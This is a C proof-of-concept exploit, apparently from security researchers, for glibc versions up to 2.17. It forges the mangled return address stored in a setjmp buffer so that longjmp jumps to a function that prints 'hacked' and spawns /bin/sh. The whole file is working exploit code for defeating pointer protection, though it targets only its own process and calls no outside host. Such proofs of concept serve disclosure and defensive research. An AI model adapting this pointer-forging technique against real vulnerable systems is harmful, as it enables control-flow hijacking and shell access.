/*
 * $FILE: bug-mangle.c
 *
 * Comment: Proof of concept for glibc versions <= 2.17
 *
 * $VERSION$
 *
 * Author: Hector Marco <hecmargi@upv.es>
 *         Ismael Ripoll <iripoll@disca.upv.es>
 *
 * $LICENSE:  
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 */

#include <stdio.h>
#include <setjmp.h>
#include <stdint.h>
#include <limits.h>

#ifdef __i386__
   #define ROTATE 0x9
   #define PC_ENV_OFFSET 0x14
#elif __x86_64__
   #define ROTATE 0x11
   #define PC_ENV_OFFSET 0x38
#elif __arm__
   #define ROTATE 0x0
   #define PC_ENV_OFFSET 0x24
#else
   #error The exploit does not support this architecture
#endif

unsigned long rol(uintptr_t value) {
   return (value << ROTATE) | (value >> (__WORDSIZE - ROTATE));
}

int hacked(){
   printf("[+] hacked !!\n");
   system("/bin/sh");
}

int main(void){
   jmp_buf env;
   uintptr_t *ptr_ret_env = (uintptr_t*) (((uintptr_t) env) + PC_ENV_OFFSET);

   printf("[+] Exploiting ...\n");
   if(setjmp(env) == 1){
      printf("[-] Exploit failed.\n");
      return 0;
   }

   /*Overwrite env return address */
   *ptr_ret_env = rol((uintptr_t)hacked);

   longjmp(env, 1);

   printf("[-] Exploit failed.\n");
   return 0;
}
